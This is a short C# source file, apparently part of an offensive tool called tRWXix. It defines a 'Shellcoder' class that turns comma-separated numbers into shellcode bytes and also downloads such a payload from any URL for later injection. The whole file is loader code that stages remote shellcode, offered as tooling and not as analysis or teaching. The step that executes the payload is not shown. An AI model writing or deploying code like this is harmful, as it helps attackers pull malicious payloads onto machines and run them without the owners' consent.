using System;

namespace tRWXix.Utils
{
    internal class Shellcoder
    {
        internal static byte[] convert(String data)
        {
            string[] data_spl = data.Split(',');
            byte[] shellcode = new byte[data_spl.Length];
            int byter = 0;
            for (int i = 0; i < shellcode.Length; i++)
            {
                byter = (int)new System.ComponentModel.Int32Converter().ConvertFromString(data_spl[i]);
                shellcode[i] = Convert.ToByte(byter);
            }
            return shellcode;
        }
        internal static byte[] fetch(String url)
        {
            System.Net.WebClient client = new System.Net.WebClient();
            string data = client.DownloadString(url);
            string[] data_spl = data.Split(',');
            byte[] shellcode = new byte[data_spl.Length];
            int byter = 0;
            for (int i = 0; i < shellcode.Length; i++)
            {
                byter = (int)new System.ComponentModel.Int32Converter().ConvertFromString(data_spl[i]);
                shellcode[i] = Convert.ToByte(byter);
            }
            return shellcode;
        }
    }
}
